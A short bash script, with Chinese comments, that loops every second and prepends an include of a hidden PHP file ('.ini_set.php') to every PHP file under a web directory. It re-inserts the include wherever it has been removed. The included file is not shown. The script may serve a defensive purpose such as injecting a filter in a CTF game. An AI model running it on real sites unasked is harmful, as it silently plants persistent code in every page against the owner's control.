#!/bin/bash

while true; do
  # 查找不包含特定字符串的文件
  files=$(grep -rL --include=\*.php "<?php include_once('/var/www/html/include/.ini_set.php'); ?>" ./)

  # 如果 $files 不为空，则输出文件列表
  if [ -n "$files" ]; then
    echo $files

    # 遍历这些文件并插入所需的字符串
    for file in $files; do
      if [ -s "$file" ]; then
        # 文件不为空时，在文件开头插入字符串
        sed -i "1i <?php include_once('/var/www/html/include/.ini_set.php'); ?>" "$file"
      else
        # 文件为空时，直接写入字符串
        echo "<?php include_once('/var/www/html/include/.ini_set.php'); ?>" > "$file"
      fi
    done
  fi

  # 间隔一秒
  sleep 1
done